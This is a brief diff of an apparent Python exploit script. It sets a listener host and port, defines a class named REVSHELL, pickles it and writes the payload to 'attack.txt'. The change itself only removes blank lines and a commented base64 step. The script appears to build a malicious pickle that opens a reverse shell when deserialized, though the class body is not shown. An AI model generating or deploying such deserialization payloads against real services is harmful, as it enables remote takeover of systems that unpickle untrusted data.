@@ -6,8 +6,6 @@ import os
 import sys
 
 
-
-
 lhost = "127.0.0.0"
 lport = "9000"
 
@@ -17,9 +15,6 @@ class REVSHELL(object):
     
 
 serialPayload = pickle.dumps(REVSHELL())
-#payload = base64.b64encode(serialPayload)
-
-
 
 file = open("attack.txt", "wb")
 file.write(serialPayload)
